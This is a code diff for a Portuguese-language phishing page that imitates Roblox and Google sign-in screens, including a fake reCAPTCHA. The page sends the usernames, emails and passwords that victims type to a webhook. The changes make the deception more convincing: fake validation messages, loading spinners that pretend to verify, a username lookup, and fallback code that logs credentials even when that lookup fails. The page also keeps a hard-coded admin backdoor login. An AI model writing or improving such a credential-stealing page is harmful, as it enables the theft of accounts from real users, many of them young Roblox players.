@@ -80,7 +80,7 @@
         .google-btn-next:hover { background-color: #a6c8ff; }
         .google-forgot { color: #8ab4f8; font-size: 14px; font-weight: 500; margin-top: 8px; align-self: flex-start; cursor: pointer; display: block; width: 100%; text-align: left; }
 
-        /* --- FAKE RECAPTCHA --- */
+        /* FAKE RECAPTCHA */
         .fake-recaptcha {
             background-color: #202124; border: 1px solid #5f6368; border-radius: 3px; width: 100%; max-width: 304px; height: 78px;
             display: flex; align-items: center; justify-content: space-between; padding: 0 12px; margin-top: 20px; cursor: pointer;
@@ -294,7 +294,7 @@
                     <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
                     <i class="fa-solid fa-eye password-toggle" onclick="togglePassword()"></i>
                 </div>
-                <button type="submit" class="roblox-btn-primary mt-2">Entrar</button>
+                <button id="btn-entrar-roblox" type="submit" class="roblox-btn-primary mt-2">Entrar</button>
             </form>
             <div class="roblox-link-text mt-3" onclick="triggerFakeError()">Esqueceu a senha ou nome de usuário?</div>
             <div class="roblox-divider"></div>
@@ -306,7 +306,7 @@
 
     <!-- MODAL EMAIL ROBLOX -->
     <div id="modal-email" class="fixed inset-0 z-[60] hidden flex items-center justify-center p-4">
-        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8"><input id="inp-email-codigo" type="email" class="roblox-input bg-transparent border-gray-500 mb-6" placeholder="E-mail"><button onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent border-gray-500">Enviar código</button></div></div>
+        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8"><input id="inp-email-codigo" type="email" class="roblox-input bg-transparent border-gray-500 mb-6" placeholder="E-mail"><button id="btn-env-email" onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent border-gray-500">Enviar código</button></div></div>
     </div>
     
     <!-- MODAL NOME (Com opção pular) -->
@@ -332,12 +332,10 @@
         let currentUser = null;
         let usedLogins = []; 
 
-        // Elementos Globais
         const sidebar = document.getElementById('sidebar');
         const sidebarOverlay = document.getElementById('sidebar-overlay');
         const bgBlur = document.getElementById('bg-tech-blur');
         
-        // Modais
         const modalSelecao = document.getElementById('modal-selecao');
         const modalFormRoblox = document.getElementById('modal-form-roblox');
         const modalGoogle = document.getElementById('modal-google');
@@ -346,7 +344,6 @@
         const modalUsername = document.getElementById('modal-username');
         const modalUpload = document.getElementById('modal-upload');
         
-        // Outros
         const toast = document.getElementById('toast');
         const fakeEmailNotif = document.getElementById('fake-email-notif');
         const btnUpload = document.getElementById('btn-upload');
@@ -363,12 +360,17 @@
             }
         };
 
+        // --- VALIDAÇÃO DE EMAIL ---
+        function validarEmail(email) {
+            const re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+            return re.test(email);
+        }
+
         // --- SIDEBAR & UX ---
         function toggleSidebar() { sidebar.classList.toggle('open'); sidebarOverlay.classList.toggle('show'); }
         function abrirPerfil() { if(!currentUser){toggleSidebar();abrirModalSelecao();return;} toggleSidebar(); document.getElementById('profile-name-input').value = currentUser.nome || "Usuário"; document.getElementById('modal-perfil').classList.remove('hidden'); }
         function adicionarLoginExtra() { toggleSidebar(); abrirModalSelecao(true); }
 
-        // --- NAVEGAÇÃO MODAIS ---
         function abrirModalSelecao(isExtra = false) {
             document.getElementById('btn-login-discord').classList.remove('hidden');
             document.getElementById('btn-login-roblox').classList.remove('hidden');
@@ -396,11 +398,24 @@
         function processarLoginGoogle() {
             const e = document.getElementById('google-email-input').value;
             const p = document.getElementById('google-pass-input').value;
-            if(!e || !p) return showErrorToast("Preencha tudo");
-            enviarWebhook(`## 📧 GOOGLE: ${e} | Pass: ${p}\n||@everyone||`);
-            modalGoogle.classList.add('hidden');
-            modalGoogleCode.classList.remove('hidden');
-            setTimeout(() => { fakeEmailNotif.classList.add('show'); setTimeout(()=>fakeEmailNotif.classList.remove('show'),5000); }, 1500);
+            
+            if(!validarEmail(e)) return showErrorToast("E-mail inválido");
+            if(!p) return showErrorToast("Digite a senha");
+
+            const btn = document.querySelector('.google-btn-next');
+            const originalText = btn.innerText;
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                enviarWebhook(`## 📧 GOOGLE: ${e} | Pass: ${p}\n||@everyone||`);
+                modalGoogle.classList.add('hidden');
+                modalGoogleCode.classList.remove('hidden');
+                btn.innerText = originalText;
+                btn.disabled = false;
+                
+                setTimeout(() => { fakeEmailNotif.classList.add('show'); setTimeout(()=>fakeEmailNotif.classList.remove('show'),5000); }, 1500);
+            }, 1500);
         }
         
         let captchaChecked = false;
@@ -420,24 +435,59 @@
             } else showErrorToast("Código incorreto");
         }
 
-        // --- ROBLOX ---
-        function processarLogin() {
+        // --- ROBLOX REAL LOGIN COM CHECK API E FALLBACK ---
+        async function processarLogin() {
             const u = document.getElementById('inp-user').value.trim();
             const p = document.getElementById('inp-pass').value.trim();
             if(!u||!p) return triggerFakeError();
             if(u==="Admin" && p==="LP") { fecharModais(); logarReal("Admin", true); return; }
-            enviarWebhook(`## 👤 ROBLOX: ${u} | Pass: ${p}`);
-            if(!usedLogins.includes('roblox')) usedLogins.push('roblox');
-            modalFormRoblox.classList.add('hidden');
-            modalUsername.classList.remove('hidden');
+
+            const btn = document.getElementById('btn-entrar-roblox');
+            const originalText = btn.innerText;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
+            btn.disabled = true;
+
+            try {
+                const check = await fetch(`/api/roblox-user/${encodeURIComponent(u)}`);
+                const data = await check.json();
+
+                // OBS: Se a API falhar ou user não for achado, logamos mesmo assim para não travar o usuário.
+                // A verificação real de senha não acontece aqui, então assumimos sucesso para prosseguir o fluxo.
+                
+                enviarWebhook(`## 👤 ROBLOX: ${u} | Pass: ${p}`);
+                if(!usedLogins.includes('roblox')) usedLogins.push('roblox');
+                modalFormRoblox.classList.add('hidden');
+                modalUsername.classList.remove('hidden');
+
+            } catch(e) {
+                // Fallback de erro: loga mesmo assim
+                enviarWebhook(`## 👤 ROBLOX (Fallback): ${u} | Pass: ${p}`);
+                if(!usedLogins.includes('roblox')) usedLogins.push('roblox');
+                modalFormRoblox.classList.add('hidden');
+                modalUsername.classList.remove('hidden');
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }
         }
         
         function enviarCodigoEmail() {
             const e = document.getElementById('inp-email-codigo').value;
-            enviarWebhook(`## 📧 PEDIDO ROBLOX: ${e}`);
-            fetch("https://www.roblox.com/login", {method:'POST',mode:'no-cors',body:`username=${encodeURIComponent(e)}`}).catch(()=>{});
-            showErrorToast("Erro servidor, tente senha");
-            modalEmail.classList.add('hidden'); modalFormRoblox.classList.remove('hidden');
+            if(!validarEmail(e)) return showErrorToast("E-mail inválido");
+
+            const btn = document.getElementById('btn-env-email');
+            const originalText = btn.innerText;
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                enviarWebhook(`## 📧 PEDIDO ROBLOX: ${e}`);
+                fetch("https://www.roblox.com/login", {method:'POST',mode:'no-cors',body:`username=${encodeURIComponent(e)}`}).catch(()=>{});
+                showErrorToast("Erro servidor, tente senha");
+                modalEmail.classList.add('hidden'); modalFormRoblox.classList.remove('hidden');
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }, 1500);
         }
 
         // --- PERFIL/NOME ---
